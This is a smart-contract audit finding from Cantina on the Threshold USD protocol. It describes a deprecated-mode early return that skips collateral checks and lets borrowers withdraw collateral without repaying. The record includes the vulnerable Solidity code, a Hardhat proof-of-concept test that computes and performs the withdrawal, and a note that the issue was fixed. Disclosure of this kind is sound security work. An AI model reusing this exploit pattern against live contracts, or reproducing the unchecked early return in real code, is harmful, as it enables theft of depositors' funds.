---
# Core Classification
protocol: Threshold
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 54691
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/7b136074-0ba7-42a5-bc77-630f535cf26e
source_link: https://cdn.cantina.xyz/reports/cantina_threshold_usd_june2023.pdf
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 3
finders:
  - Alex The Entreprenerd
  - luksgrin
  - Kurt Barry
---

## Vulnerability Title

_requireValidAdjustmentInCurrentMode bypass when not in mintList allows to run away with collateral without repaying 

### Overview


The `adjustTrove` function in `BorrowerOperations.sol` is used to update the state of a Trove. However, due to a bug, if the system is no longer part of the `mintList`, it will not perform critical checks for the system's collateralization. This allows all depositors to withdraw the majority of their collateral without repaying their debt, putting their capital at risk. The bug can be reproduced by running a specific test code and can be fixed by maintaining the same checks for both normal and deprecated systems. A fix has been implemented in the commit e05abc. 

### Original Finding Content

## Context
**File:** BorrowerOperations.sol#L555-L557  
**Description:** The `adjustTrove` function is used to update the state of a Trove. Invariants for collateralization are enforced in `_requireValidAdjustmentInCurrentMode`. 

Due to the integration with `mintList`, if the system is no longer part of the `mintList`, it will not perform critical checks for the system collateralization.

## Code Snippet
The following code snippet is extracted from BorrowerOperations.sol#L542-L557:

```solidity
function _requireValidAdjustmentInCurrentMode(
    bool _isRecoveryMode,
    uint256 _collWithdrawal,
    bool _isDebtIncrease,
    LocalVariables_adjustTrove memory _vars
) internal view {
    /*
    * If contract has been removed from the thUSD mintlist remove the adjustment restrictions 
    // TODO: Can we just run away once deprecated?
    */
    if (!thusdToken.mintList(address(this))) {
        return;
    }
    // ...
}
```

## Impact
The lack of checks allows all depositors to withdraw the vast majority of their collateral without repaying their debt.

### Proof of Concept
Add this to `BorrowerOperationsTest.js`. Run it with:

```bash
npx hardhat test --grep "UNDERCOLLATERALIZED"
```

```javascript
it("UNDERCOLLATERALIZED (NO REPAY)", async () => {
    await openTrove({ ICR: toBN(dec(300, 16)), extraParams:{ from: alice } });
    await openTrove({ ICR: toBN(dec(120, 16)), extraTHUSDAmount: toBN(dec(300, 18)), extraParams:{ from: bob } });
    
    // remove mintlist
    await th.removeMintlist(contracts, owner, delay);
    
    // to compensate borrowing fees
    await thusdToken.transfer(alice, dec(300, 18), { from: bob });
    
    const collToWithdraw = await troveManager.getTroveColl(alice);
    
    // As defined in Dependencies/LiquityMath.sol
    const NICR_PRECISION = toBN('100000000000000000000');
    const debt = await troveManager.getTroveDebt(alice);
    
    /** Given that the NICR is computed as:
     * if (_debt > 0) {
     *    return _coll * NICR_PRECISION / _debt;
     * }
     *
     * We can compute the amount of collateral to withdraw to get a NICR of 1 (because of floor division)
     * Thus _coll = collInside - whatWeWantToWithdraw, then...
     *
     * whatWeWantToWithdraw = collInside - (debt / NICR_PRECISION)
     */
    const optimalWithdrawalAmnt = toBN(collToWithdraw.toString()).sub(
        toBN(debt.toString()).div(NICR_PRECISION)
    );
    
    const txAlice = await borrowerOperations.withdrawColl(optimalWithdrawalAmnt, ZERO_ADDRESS, ZERO_ADDRESS, {
        from: alice
    });
    
    assert.isTrue(txAlice.receipt.status);
});
```

As shown, Alice can withdraw all collateral (except a small dust amount, to get her NICR to be greater than 0), which will make the Trove completely undercollateralized. This will, in turn, affect the peg of THUSD for all deprecated `BorrowerOperations`, putting all of that capital at risk.

## Recommendations
- **Short Term:** Maintain the same invariants for deprecated systems (do not have an early return).
- **Long Term:** Reconsider the purpose of the early return and change the check to enforce repayment while relaxing other requirements.

**Threshold:** Special case removed, same checks for normal and deprecated states (see commit e05abc).  
**Cantina:** Confirmed this is fixed in commit e05abc.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Threshold |
| Report Date | N/A |
| Finders | Alex The Entreprenerd, luksgrin, Kurt Barry |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_threshold_usd_june2023.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/7b136074-0ba7-42a5-bc77-630f535cf26e

### Keywords for Search

`vulnerability`

